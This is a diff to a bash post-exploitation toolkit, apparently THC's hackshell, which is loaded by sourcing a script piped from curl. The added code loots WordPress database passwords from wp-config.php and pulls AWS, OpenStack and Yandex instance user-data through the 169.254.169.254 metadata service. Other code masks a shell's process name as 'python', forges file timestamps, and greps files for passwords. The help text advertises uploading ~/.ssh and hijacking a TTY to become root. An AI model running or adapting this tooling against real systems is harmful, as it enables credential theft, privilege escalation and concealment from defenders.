@@ -129,9 +129,11 @@ notime() {
 # Set the ctime to the file's mtime
 ctime() {
     local fn
+    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return 255; }
 
     for fn in "$@"; do
         notime "${fn}" chmod --reference "${fn}" "${fn}"
+        # FIXME: warning if Birth time is newer than ctime or mtime.
     done
 }
 
@@ -401,9 +403,14 @@ np() {
 }
 
 zapme() {
+    local name="${1}"
     _hs_dep zapper || return
-    HS_WARN "Starting new/zapper SHELL. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
-    exec zapper -f -a"${1:--}" bash -il
+    HS_WARN "Starting new/zap'ed shell. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
+    [ -z "$name" ] && {
+        HS_INFO "Apps will hide as ${CDY}python${CDM}. Use ${CDC}zapme -${CDM} for NO name."
+        name="python"
+    }
+    exec zapper -f -a"${name}" bash -il
 }
 
 # Find writeable dirctory but without displaying sub-folders
@@ -424,7 +431,7 @@ wfind() {
 
 # Only output the 16 charges before and 32 chars after..
 hgrep() {
-    grep -HEronasi  ".{,16}${1:-password}.{,32}" .
+    grep -HEronasie  ".{,16}${1:-password}.{,32}" .
 }
 
 dbin() {
@@ -566,6 +573,18 @@ loot_bitrix() {
     echo -en "${CN}"
 }
 
+_loot_wp() {
+    local fn="${1:?}"
+    local str
+    [ ! -f "$fn" ] && return
+
+    str="$(grep -v ^# "$fn" | grep -E "DB_(NAME|USER|PASSWORD|HOST)")"
+    [[ "$str" == *"_here"* ]] && return
+    echo -e "${CB}WordPress-DB ${CDY}${fn}${CF}"
+    echo "${str}"
+    echo -en "${CN}"
+}
+
 # _loot_home <NAME> <filename>
 _loot_homes() {
     local fn
@@ -579,18 +598,23 @@ _loot_homes() {
 
 _loot_openstack() {
     local str
+    local rv
 
     [ -n "$_HS_NOT_OPENSTACK" ] && return
     [ -n "$_HS_NO_SSRF_169" ] && return
+    [ -n "$_HS_GOT_SSRF_169" ] && return
 
     str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
-        [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
+        rv="$?"
+        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
         unset str
     }
+
     [ -z "$str" ] && {
         _HS_NOT_OPENSTACK=1
         return 255
     }
+    _HS_GOT_SSRF_169=1
     echo -e "${CB}OpenStack user_data${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
@@ -603,14 +627,17 @@ _loot_aws() {
     local str
     local TOKEN
     local role
+    local rv
 
     [ -n "$_HS_NOT_AWS" ] && return
     [ -n "$_HS_NO_SSRF_169" ] && return
+    [ -n "$_HS_GOT_SSRF_169" ] && return
 
     command -v curl >/dev/null || return # AWS always has curl
 
     str="$(timeout 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
-        [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
+        rv="$?"
+        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
         unset str
     }
     [ -z "$str" ] && {
@@ -619,6 +646,7 @@ _loot_aws() {
     }
     TOKEN="$str"
 
+    _HS_GOT_SSRF_169=1
     str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null)"
     [ -n "$str" ] && [[ "$str" != *Lightsail* ]] && {
         echo -e "${CB}AWS user-data (config)${CDY}${CF}"
@@ -645,12 +673,15 @@ _loot_aws() {
 
 _loot_yandex() {
     local str
+    local rv
 
     [ -n "$_HS_NOT_YC" ] && return
     [ -n "$_HS_NO_SSRF_169" ] && return
+    [ -n "$_HS_GOT_SSRF_169" ] && return
 
     str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/latest/user-data'" 2>/dev/null)" || {
-        [ "$?" -eq 124 ] && _HS_NO_SSRF_169=1
+        rv="$?"
+        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
         unset str
     }
     [ -z "$str" ] && {
@@ -658,6 +689,7 @@ _loot_yandex() {
         return 255
     }
 
+    _HS_GOT_SSRF_169=1
     echo -e "${CB}Yandex Cloud user-data (config)${CDY}${CF}"
     echo "$str"
     echo -en "${CN}"
@@ -715,6 +747,7 @@ loot() {
     local h="${_HS_HOME_ORIG:-$HOME}"
     local str
 
+    unset _HS_GOT_SSRF_169
     for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
         [ ! -s "$fn" ] && continue
         echo -e "${CB}MySQL ${CDY}${fn}${CF}"
@@ -737,6 +770,10 @@ loot() {
 
     find /var/www -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
         loot_bitrix "$fn"
+    done
+
+    find /var/www "${h}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
+        _loot_wp "$fn"
     done
 
     ### SSH Keys
@@ -766,9 +803,14 @@ loot() {
     _loot_openstack
     _loot_aws
     _loot_yandex
+
     [ -z "$_HS_NO_SSRF_169" ] && {
         # Found an SSRF
         echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
+    }
+
+    [ "$UID" -ne 0 ] && {
+        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
     }
 
     lootlight
@@ -882,7 +924,7 @@ hs_exit() {
             _hs_destruct
         fi
     }
-    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.lorg/tips${CN} 😘"
+    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
     kill -9 $$
 }
 
@@ -1092,7 +1134,7 @@ ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no htt
 ${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python
 ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
-${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
+${CDC} notime <file> touch foo.dat           ${CDM}Execute a command at the <file>'s mtime
 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
 ${CDC} ctime <file>                          ${CDM}Set ctime to file's mtime ${CN}${CF}[find . -ctime -1]
 ${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
